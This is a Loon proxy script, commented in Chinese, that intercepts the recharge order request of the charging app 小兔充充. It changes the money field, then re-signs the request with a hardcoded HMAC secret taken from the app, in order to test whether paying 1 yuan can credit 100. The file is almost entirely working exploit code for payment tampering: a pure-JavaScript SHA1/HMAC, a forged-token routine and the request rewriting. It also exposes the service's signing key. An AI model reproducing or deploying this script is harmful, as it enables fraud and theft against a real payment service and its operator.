/**
 * Loon http-request 脚本 — 「小兔充充」充值金额篡改
 * 
 * 功能: 拦截 wallet/charge/makeOrder 请求, 篡改 money 字段并重签 token
 * 用法: loon_config.conf 里 [Script] 配 http-request 指到本文件
 * 
 * 判定逻辑:
 *   充值输 1 元 → 本脚本改 money=1 为 100 → 看微信支付弹窗金额
 *   弹窗=100 → 服务端按篡改值生成 prepay → 应付=到账, 分离不成立
 *   弹窗=1   → prepay 按原值 → 到账若 100 则分离成立(付1到100)
 */

const TAMPER_TO = "100";          // 篡改目标金额
const SECRET    = "6D025A4E0DF3E14139F4CD3BCC6E8CDBC36824AE"; // tokenSecret

// ============ HMAC-SHA1 纯 JS 实现 (Loon JSC 无 crypto 库) ============
function sha1(msg){
  function rotl(n,s){return (n<<s)|(n>>>(32-s));}
  function tohex(v){var s="",i;for(i=7;i>=0;i--)s+=((v>>>i*4)&0x0f).toString(16);return s;}
  var bytes=[];for(var i=0;i<msg.length;i++)bytes.push(msg.charCodeAt(i)&0xff);
  var len=bytes.length;bytes.push(0x80);
  while(bytes.length%64!==56)bytes.push(0);
  var l=len*8;
  for(var i=7;i>=0;i--)bytes.push((l/Math.pow(256,i))&0xff);
  var h0=0x67452301,h1=0xEFCDAB89,h2=0x98BADCFE,h3=0x10325476,h4=0xC3D2E1F0;
  for(var b=0;b<bytes.length;b+=64){
    var w=[];for(var i=0;i<16;i++)w[i]=(bytes[b+i*4]<<24)|(bytes[b+i*4+1]<<16)|(bytes[b+i*4+2]<<8)|bytes[b+i*4+3];
    for(var i=16;i<80;i++)w[i]=rotl(w[i-3]^w[i-8]^w[i-14]^w[i-16],1);
    var a=h0,bv=h1,c=h2,d=h3,e=h4,f,k;
    for(var i=0;i<80;i++){
      if(i<20){f=(bv&c)|((~bv)&d);k=0x5A827999;}
      else if(i<40){f=bv^c^d;k=0x6ED9EBA1;}
      else if(i<60){f=(bv&c)|(bv&d)|(c&d);k=0x8F1BBCDC;}
      else{f=bv^c^d;k=0xCA62C1D6;}
      var t=(rotl(a,5)+f+e+k+w[i])|0;
      e=d;d=c;c=rotl(bv,30);bv=a;a=t;
    }
    h0=(h0+a)|0;h1=(h1+bv)|0;h2=(h2+c)|0;h3=(h3+d)|0;h4=(h4+e)|0;
  }
  return tohex(h0)+tohex(h1)+tohex(h2)+tohex(h3)+tohex(h4);
}
function hmacSha1(keyStr,msgStr){
  var key=[];for(var i=0;i<keyStr.length;i++)key.push(keyStr.charCodeAt(i)&0xff);
  if(key.length>64){var h=sha1(keyStr);key=[];for(var i=0;i<40;i+=2)key.push(parseInt(h.substr(i,2),16));}
  while(key.length<64)key.push(0);
  var ipad=key.map(b=>b^0x36), opad=key.map(b=>b^0x5c);
  var inner=String.fromCharCode.apply(null,ipad)+msgStr;
  var ihash=sha1(inner);
  var outer=String.fromCharCode.apply(null,opad)+String.fromCharCode.apply(null,ihash.match(/../g).map(h=>parseInt(h,16)));
  return sha1(outer);
}

// ============ 重签 ============
function resign(body){
  var params={};
  body.split('&').forEach(function(kv){
    var i=kv.indexOf('=');if(i<0)return;
    var k=kv.substring(0,i),v=kv.substring(i+1);
    if(k!=='token')params[k]=v;
  });
  var keys=Object.keys(params).sort();
  var base=keys.map(k=>k+'='+params[k]).join('&');
  var token=hmacSha1(SECRET,base).toUpperCase();
  params['token']=token;
  return keys.concat(['token']).map(k=>k+'='+params[k]).join('&');
}

// ============ 主逻辑 ============
var url=$request.url||"";
var body=$request.body||"";

if(url.indexOf("charge/makeOrder")>=0 && body.indexOf("money=")>=0){
  var nb=body.replace(/money=[0-9.]+/,"money="+TAMPER_TO);
  nb=resign(nb); // 重签
  console.log("[XTCC] TAMPER makeOrder money->"+TAMPER_TO);
  console.log("[XTCC] new body: "+nb.substring(0,300));
  $done({body:nb});
}else if(url.indexOf("xt_pay/call")>=0 || url.indexOf("callPay")>=0){
  console.log("[XTCC] callPay req: "+body.substring(0,300));
  $done({});
}else if(url.indexOf("charge/detail")>=0 || url.indexOf("rechargeDetail")>=0){
  console.log("[XTCC] detail req: "+body.substring(0,200));
  $done({});
}else{
  $done({});
}
